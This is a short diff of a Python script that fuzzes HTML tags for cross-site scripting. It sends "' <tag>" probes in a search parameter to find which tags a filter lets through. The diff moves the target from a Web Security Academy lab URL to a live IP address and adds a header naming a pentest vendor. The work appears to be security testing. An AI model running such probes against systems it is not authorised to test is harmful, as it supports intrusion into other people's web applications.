@@ -3,16 +3,16 @@
 import requests
 import concurrent.futures
 
-url=f'https://0a6a006a0342baf580d39e5c00e1000e.web-security-academy.net/'
+url=f'https://107.22.154.211:8443/'
 
-sessions = {"session": "1F9h5JgZi46OqdNQGnxjoeQR6pVavYJc"}
+# sessions = {"session": "eXFj2TAFibNqLWi4gwNwo3GpXA3fmGhY"}
 
 def find_tag(tag):
     payload = f"' <{tag}>"
     para_send = {
-        "search":payload
+        "q":payload
     }
-    response = requests.get(url,params=para_send,cookies=sessions)
+    response = requests.get(url,params=para_send,headers={"X-Vendor": "DATAFARM-PENTEST"})
     if response.status_code==200 :
         return tag
     return None
